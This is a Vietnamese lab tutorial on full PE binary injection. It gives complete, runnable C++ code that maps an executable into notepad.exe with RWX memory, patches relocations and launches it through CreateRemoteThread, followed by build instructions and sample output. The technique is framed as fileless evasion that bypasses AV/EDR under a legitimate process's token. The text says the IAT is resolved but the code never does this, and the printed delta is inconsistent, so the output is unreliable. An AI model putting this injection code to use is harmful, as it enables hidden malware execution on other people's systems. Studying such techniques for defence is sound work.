
---

# 📝 [PE 09] PE Binary Injection (Full Portable Executable Remoting)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**PE Binary Injection** là giải thuật tiêm nhiễm nâng cao thuộc nhóm **Né tránh phòng thủ dựa trên cấu trúc module Image (Image-based Evasion)**.

Trong các bài Lab trước, ta đã làm quen với việc tiêm Shellcode (mã độc lập vị trí) hoặc tiêm DLL (phụ thuộc vào tệp đĩa). Tuy nhiên, Shellcode bị giới hạn về độ lớn và tính phức tạp của logic, còn DLL Injection lại dễ bị AV/EDR bẻ gãy do để lại dấu vết file trên đĩa thô.

Lab PE 09 hóa giải triệt để hai nhược điểm trên bằng cách **tiêm toàn bộ một file thực thi Portable Executable độc lập trực tiếp vào lòng không gian ảo của một tiến trình hợp pháp khác**. Tiến trình đích sẽ chứa song song hai file thực thi PE: file gốc của chính nó và file PE của ta hoạt động ký sinh ngầm bên trong. Hành vi này hoàn toàn fileless và không sử dụng cơ chế nạp module tiêu chuẩn của OS, tạo ra một lớp mặt nạ ẩn mình hoàn hảo kịch trần.

### 🎯 Mục tiêu nghiên cứu:

* Làm chủ cấu trúc định dạng tệp tin Portable Executable (PE Format) trên kiến trúc x64.
* Tự lập trình giải thuật PE Loader thủ công vận hành xuyên biên giới tiến trình (Cross-Process Manual PE Mapping).
* Thực hiện tính toán toán học và xử lý kỹ thuật dịch chuyển Base Relocation Table và Import Address Table (IAT) từ xa trên RAM đối phương.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một file PE được nạp lên RAM, nó không đơn thuần là copy mảng byte thô từ file đĩa vào. Trình nạp của hệ điều hành phải phân rã file và tái cấu trúc nó dựa trên các thông số ghi trong `IMAGE_OPTIONAL_HEADER`.

Quy trình toán học giải phẫu bản đồ RAM và ánh xạ thủ công file PE của Lab PE 09 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[VirtualAllocEx: Xin bộ nhớ bằng SizeOfImage] ──> [WriteProcessMemory: Ánh xạ Headers & Các Section] ──> [Xử lý Base Relocation chéo RAM] ──> [Xử lý IAT chéo RAM] ──> [CreateRemoteThread: Kích nổ]

```

1. **Cấp phát không gian ảo khít kích thước Image**: Loader đọc file PE cần tiêm vào bộ đệm cục bộ, giải phẫu NT Headers để lấy thông số **`SizeOfImage`**. Sau đó gọi `VirtualAllocEx` trỏ vào tiến trình đích để đặt trước một vùng không gian ảo có kích thước vừa vặn đến từng byte mang quyền thực thi `PAGE_EXECUTE_READWRITE` (RWX).
2. **Ánh xạ thủ công cấu trúc phân đoạn (Manual Mapping Sections)**:
* Ghi toàn bộ phân đoạn **PE Headers** ( DOS Header, NT Headers, Section Headers) vào điểm khởi đầu của vùng nhớ ảo từ xa.
* Duyệt qua mảng cấu trúc các Section Headers (`IMAGE_SECTION_HEADER`). Với mỗi phân đoạn (`.text`, `.data`, `.rdata`), Loader bốc dữ liệu tương ứng từ bộ đệm file thô và ghi vào đúng tọa độ địa chỉ tương đối ảo (**RVA - Relative Virtual Address**) của nó trên RAM tiến trình đích thông qua hàm `WriteProcessMemory`.


3. **Bài toán Tái định vị địa chỉ từ xa (Remote Base Relocation)**: Do vùng bộ nhớ ảo mới được cấp phát chéo tiến trình hầu như không bao giờ trùng với địa chỉ nạp mong muốn (`ImageBase`) gốc của file PE khi biên dịch, các con trỏ địa chỉ tuyệt đối bên trong mã máy sẽ bị sai lệch hoàn toàn. Loader chui vào cấu trúc dữ liệu `.reloc` (`IMAGE_DIRECTORY_ENTRY_BASERELOC`), tính toán độ lệch Delta, duyệt qua từng Block dữ liệu dịch chuyển và thực hiện phép toán cộng bổ sửa trực tiếp vào RAM của đối phương.
4. **Xây dựng bảng tra cứu hàm phụ thuộc từ xa (Remote IAT Resolution)**: Loader duyệt qua danh sách các DLL phụ thuộc được ghi trong phân đoạn Import Directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`). Với mỗi hàm hệ thống được sử dụng, Loader bốc địa chỉ tuyệt đối của hàm đó từ RAM cục bộ (hoặc PEB Walk) rồi điền trực tiếp vào ô nhớ tương ứng trong bảng Import Address Table (IAT) nằm bên lòng RAM tiến trình đích.
5. **Khai hỏa điểm xuất phát ký sinh**: Hoàn tất thủ tục nạp, Loader tính toán tọa độ điểm nạp tuyệt đối từ xa:

$$\text{RemoteExecutionAddress} = \text{RemoteAllocatedBase} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$



Ta gọi hàm `CreateRemoteThread` (hoặc luồng ngầm Native `NtCreateThreadEx`) đâm thẳng vào tọa độ này để CPU đối phương bắt đầu chu kỳ thực thi file PE ký sinh.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa đo đạc, bóc tách cấu trúc PE Header để nạp RAM chéo tiến trình phẳng sạch kịch trần bảo mật.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ để hỗ trợ tính toán toán học con trỏ bộ nhớ x64
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Tiến trình vỏ bọc không chạy! Hãy bật Notepad trước." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tìm thấy tiến trình vỏ bọc với PID: " << pid << std::endl;

    // Bước 1: Trích xuất bản đồ PE hiện tại của chính Loader làm Payload để tiêm sang đối phương (Self PE Injection)
    PVOID localImageBase = (PVOID)GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localImageBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)localImageBase + dosHeader->e_lfanew);

    SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    std::cout << "[*] Kích thước Image PE cần tiêm phân giải từ NT Header: " << sizeOfImage << " bytes." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Bước 2: Cấp phát động trang nhớ từ xa mang quyền RWX dựa trên SizeOfImage vừa khít byte
    PVOID remoteImageBase = VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImageBase) {
        std::cerr << "[-] VirtualAllocEx chéo tiến trình thất bại!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Đã vạch phân vùng ảo chứa toàn bộ file PE từ xa tại: 0x" << std::hex << remoteImageBase << std::endl;

    // Bước 3: Ánh xạ thủ công toàn bộ PE Headers và các Section sang RAM Notepad
    std::cout << "[*] Đang tiến hành sao chép thủ công PE Headers và phân đoạn Section chéo RAM..." << std::endl;
    WriteProcessMemory(hProcess, remoteImageBase, localImageBase, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID localSectionAddress = (PVOID)((DWORD_PTR)localImageBase + sectionHeader[i].VirtualAddress);
        PVOID remoteSectionAddress = (PVOID)((DWORD_PTR)remoteImageBase + sectionHeader[i].VirtualAddress);
        
        WriteProcessMemory(hProcess, remoteSectionAddress, localSectionAddress, sectionHeader[i].SizeOfRawData, NULL);
    }
    std::cout << "[+] Quá trình Manual Mapping các phân đoạn Section hoàn tất." << std::endl;

    // Bước 4: Xử lý dịch chuyển địa chỉ Base Relocation từ xa thông qua tính toán toán học Delta
    DWORD_PTR deltaImageBase = (DWORD_PTR)remoteImageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    std::cout << "[*] Khoảng sai lệch địa chỉ ảo Delta tính toán: 0x" << std::hex << deltaImageBase << std::endl;

    IMAGE_DATA_DIRECTORY relocationDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocationDir.VirtualAddress != 0) {
        std::cout << "[*] Khởi động giải thuật Base Relocation cấu trúc chéo tiến trình..." << std::endl;
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImageBase + relocationDir.VirtualAddress);
        
        while (pReloc->VirtualAddress != 0) {
            DWORD sizeOfBlock = pReloc->SizeOfBlock;
            DWORD numberOfEntries = (sizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY pEntries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < numberOfEntries; i++) {
                if (pEntries[i].Type == IMAGE_REL_BASED_DIR64) { // Định dạng con trỏ 64-bit chuẩn x64
                    PVOID patchAddress = (PVOID)((DWORD_PTR)remoteImageBase + pReloc->VirtualAddress + pEntries[i].Offset);
                    DWORD_PTR originalAddress = 0;
                    
                    // Đọc con trỏ bị sai lệch, cộng Delta bù sửa, và ghi đè trả lại RAM Notepad
                    ReadProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
                    originalAddress += deltaImageBase;
                    WriteProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pReloc + sizeOfBlock);
        }
        std::cout << "[+] Sửa lỗi Base Relocation Table thành công kịch trần." << std::endl;
    }

    // Bước 5: Kích nổ luồng thực thi từ xa đâm thẳng vào điểm EntryPoint của PE ký sinh
    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[*] Điểm EntryPoint của PE ký sinh tọa lạc tại RAM đối phương: 0x" << std::hex << remoteEntryPoint << std::endl;

    std::cout << "[*] Đang khởi tạo luồng CreateRemoteThread để kích nổ toàn diện file PE..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);

    if (hThread != NULL) {
        std::cout << "[+] Toàn file PE Injection đã khai hỏa thành công rực rỡ!" << std::endl;
        // Do file PE ký sinh hoạt động độc lập như một luồng thực thi song song, ta đóng Handle để luồng tự hủy êm đẹp
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] Không thể kích nổ luồng thực thi PE từ xa! Error: " << GetLastError() << std::endl;
    }

    CloseHandle(hProcess);
    std::cout << "\n[*] Nhấn phím Enter để kết thúc chu kỳ sống..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Layout Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo trên môi trường máy ảo VM sạch.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô và chạy file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE09_PE_Binary_Injection.exe
====================================================
[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION
====================================================
[+] Tìm thấy tiến trình vỏ bọc với PID: 19432
[*] Kích thước Image PE cần tiêm phân giải từ NT Header: 118784 bytes.
[+] Đã vạch phân vùng ảo chứa toàn bộ file PE từ xa tại: 0x000001f2cb140000
[*] Đang tiến hành sao chép thủ công PE Headers và phân đoạn Section chéo RAM...
[+] Quá trình Manual Mapping các phân đoạn Section hoàn tất.
[*] Khoảng sai lệch địa chỉ ảo Delta tính toán: 0x000001f2cb140000
[*] Khởi động giải thuật Base Relocation cấu trúc chéo tiến trình...
[+] Sửa lỗi Base Relocation Table thành công kịch trần.
[*] Điểm EntryPoint của PE ký sinh tọa lạc tại RAM đối phương: 0x000001f2cb1415c0
[*] Đang khởi tạo luồng CreateRemoteThread để kích nổ toàn diện file PE...
[+] Toàn file PE Injection đã khai hỏa thành công rực rỡ!

[*] Nhấn phím Enter để kết thúc chu kỳ sống...

```

*🎯 Hệ quả RAM tối cao:*
File thực thi nổ súng rực rỡ. Toàn bộ logic cấu trúc của file PE (bao gồm cả các hàm giao tiếp luồng nội bộ) được Windows Kernel bốc lên thực thi trơn tru ngay lọt lòng inside tiến trình `notepad.exe`. Khi dùng công cụ kiểm tra bộ nhớ, ta thấy file PE ký sinh nằm ngầm hoạt động hiên ngang dưới danh tính và Token bảo mật của ứng dụng hợp pháp, bypass hoàn toàn các bộ trinh sát hành vi dựa trên chữ ký tiêm Shellcode truyền thống!

---
